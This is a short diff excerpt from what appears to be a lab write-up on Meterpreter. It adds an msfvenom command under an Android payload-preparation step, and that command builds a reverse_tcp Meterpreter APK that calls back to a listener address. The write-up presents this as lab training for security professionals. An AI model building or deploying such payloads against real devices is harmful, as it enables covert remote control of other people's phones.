@@ -55,6 +55,7 @@ Meterpreter provides an interactive session that allows security professionals t
 ## Step 1 – Android Payload Preparation
 
 An Android APK file was prepared for use within the lab environment.
+**msfvenom -p android/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=4444 > android.apk**
 
 Screenshot: Payload Creation
 
